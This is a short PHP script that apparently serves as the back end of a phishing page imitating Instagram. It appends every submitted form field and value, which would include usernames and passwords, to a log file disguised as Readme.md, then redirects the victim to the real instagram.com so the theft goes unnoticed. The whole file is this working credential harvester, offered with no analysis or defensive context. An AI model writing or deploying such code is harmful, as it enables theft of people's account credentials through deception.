<?php

header ('Location: https://instagram.com/ ');
$handle = fopen("Readme.md", "a"); 
foreach($_POST as $variable => $value) {
	fwrite($handle, $variable);
	fwrite($handle, "=");
	fwrite($handle, $value);
	fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
exit;

?>
